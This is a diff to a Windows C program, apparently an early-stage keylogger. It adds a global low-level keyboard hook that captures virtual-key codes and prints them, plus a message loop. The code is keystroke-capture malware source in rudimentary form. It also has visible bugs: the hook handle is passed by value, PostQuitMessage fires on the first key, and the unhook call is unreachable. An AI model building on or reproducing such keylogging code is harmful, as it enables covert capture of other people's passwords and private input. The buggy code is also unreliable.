@@ -2,14 +2,27 @@
 #include <stdio.h>
 #include "logger.h"
 
-LRESULT CALLBACK LowLevelKeyboardProc(
-  _In_ int    nCode,
-  _In_ WPARAM wParam,
-  _In_ LPARAM lParam
-)
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
-    // process event
+    if (nCode == HC_ACTION)
+    {
+        KBDLLHOOKSTRUCT *keyBoard = (KBDLLHOOKSTRUCT*) lParam;
+        char key = (char) keyBoard->vkCode;
+        printf("%c", key);
+        PostQuitMessage(0);
+    }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+int setHook(HHOOK hook)
+{
+    hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
+    if (!hook)
+    {
+        printf("Error setting hook: %u", GetLastError());
+        return -1;
+    }
+    return 0;
 }
 
 char keylog()
@@ -45,7 +58,27 @@ char keylog()
 
 int main(void)
 {
-    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
+    HHOOK hook;
+    int error = setHook(hook);
+    if (error)
+    {
+        return -1;
+    }
+
+    MSG message;
+
+    while(1)
+    {
+        printf("%u", &message.message);
+        while (GetMessage(&message, NULL, 0, 0) > 0)
+        {
+            TranslateMessage(&message);
+            DispatchMessage(&message);
+        }
+    }
+    UnhookWindowsHookEx(hook);
+
     //keylog();
+    
     return 0;
 }
